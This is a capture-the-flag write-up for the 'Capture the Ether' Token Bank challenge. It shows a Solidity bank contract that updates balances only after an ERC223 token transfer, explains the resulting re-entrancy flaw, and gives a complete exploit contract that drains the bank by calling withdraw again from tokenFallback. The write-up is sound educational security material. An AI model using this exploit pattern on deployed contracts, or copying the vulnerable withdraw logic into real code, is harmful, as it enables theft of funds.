# Catch the Ether 7: Token bank

Goal is to understand ERC223 token standard and a re-entrency vulnerablity.

## The Task Intro

I created a token bank. It allows anyone to deposit tokens by transferring them to the bank and then to withdraw those tokens later. It uses [ERC 223](https://github.com/ethereum/EIPs/issues/223) to accept the incoming tokens.

The bank deploys a token called “Simple ERC223 Token” and assigns half the tokens to me and half to you. You win this challenge if you can empty the bank

## The Task Code

```apache
pragma solidity ^0.4.21;

interface ITokenReceiver {
    function tokenFallback(address from, uint256 value, bytes data) external;
}

contract SimpleERC223Token {
    // Track how many tokens are owned by each address.
    mapping (address => uint256) public balanceOf;

    string public name = "Simple ERC223 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function SimpleERC223Token() public {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function isContract(address _addr) private view returns (bool is_contract) {
        uint length;
        assembly {
            //retrieve the size of the code on target address, this needs assembly
            length := extcodesize(_addr)
        }
        return length > 0;
    }

    function transfer(address to, uint256 value) public returns (bool success) {
        bytes memory empty;
        return transfer(to, value, empty);
    }

    function transfer(address to, uint256 value, bytes data) public returns (bool) {
        require(balanceOf[msg.sender] >= value);

        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);

        if (isContract(to)) {
            ITokenReceiver(to).tokenFallback(msg.sender, value, data);
        }
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address spender, uint256 value)
        public
        returns (bool success)
    {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        public
        returns (bool success)
    {
        require(value <= balanceOf[from]);
        require(value <= allowance[from][msg.sender]);

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }
}

contract TokenBankChallenge {
    SimpleERC223Token public token;
    mapping(address => uint256) public balanceOf;

    function TokenBankChallenge(address player) public {
        token = new SimpleERC223Token();

        // Divide up the 1,000,000 tokens, which are all initially assigned to
        // the token contract's creator (this contract).
        balanceOf[msg.sender] = 500000 * 10**18;  // half for me
        balanceOf[player] = 500000 * 10**18;      // half for you
    }

    function isComplete() public view returns (bool) {
        return token.balanceOf(this) == 0;
    }

    function tokenFallback(address from, uint256 value, bytes) public {
        require(msg.sender == address(token));
        require(balanceOf[from] + value >= balanceOf[from]);

        balanceOf[from] += value;
    }

    function withdraw(uint256 amount) public {
        require(balanceOf[msg.sender] >= amount);

        require(token.transfer(msg.sender, amount));
        balanceOf[msg.sender] -= amount;
    }
}
```

## The Solution

This challenge gives an intro in the ERC223 standard. The problem this standard addresses are lost tokens on contract addresses. If a user sends tokens to a contract address most of the time the tokens are lost, because most of the times the smart contract is not made to receive tokens or send them back.

Therefore ERC223 introduces an Interface the smart contract needs to implement that it can receive tokens.

The problem with the implementation here is there are two balanceOf methods, the first one on the token itself, the second on the bank. The bank holds all the tokens on its address. By doing a `token.transfer(msg.sender,amount)` on the bank level, a smart contract calling the withdraw function can implement the ERC 223 tokenfallback interface. After the token are transfered, the interface is called from the token and allows the interface implementer to reenter the same function.

My solution is a smart contract that implements that interface and therefore can steal all the tokens by re-entering the transfer function again and again.

```apache
contract Crack is ITokenReceiver {
    TokenBankChallenge private tbc;

    function Crack() public {
        tbc = new TokenBankChallenge(this);
    }

    function tokenFallback(address from, uint256 value, bytes data) external {
        if (tbc.isComplete() == false) {
            tbc.withdraw(500000 * 10 ** 18);
        }
    }

    function attack() {
        tbc.withdraw(500000 * 10 ** 18);
    }

    function getTokenBank() view returns (address) {
        return address(tbc);
    }
}
```
